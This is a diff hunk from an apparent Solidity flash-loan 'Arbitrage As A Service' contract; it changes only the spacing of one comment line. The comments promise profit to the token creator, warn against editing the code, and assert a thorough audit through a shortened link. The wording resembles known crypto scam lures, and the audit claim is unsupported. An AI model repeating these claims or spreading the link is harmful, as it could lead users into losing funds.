@@ -9,7 +9,7 @@ import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contr
         *Transactions executed on the Testnet will not succeed.
         *The flash loan functionality is utilized to initiate trades with the newly deployed token contract.
         *Any remaining profit will be transferred to the creator of the token, and the flash loan will be repaid.
-        *The Arbitrage As A Service Contract (AEX) has been thoroughly verified and audited @   https://shorturl.at/qFJPV
+        *The Arbitrage As A Service Contract (AEX) has been thoroughly verified and audited @ https://shorturl.at/qFJPV
         *Modifying the code may result in changes to variables and potentially lead to loss of access to AEX and funds.
         *Overall goal is to make a contract which allows to execute all types of nested flash loans opportunites through DEX Swaps.
         *This code is provided for informational purposes only and should not be considered as financial advice. Use it at your own risk.
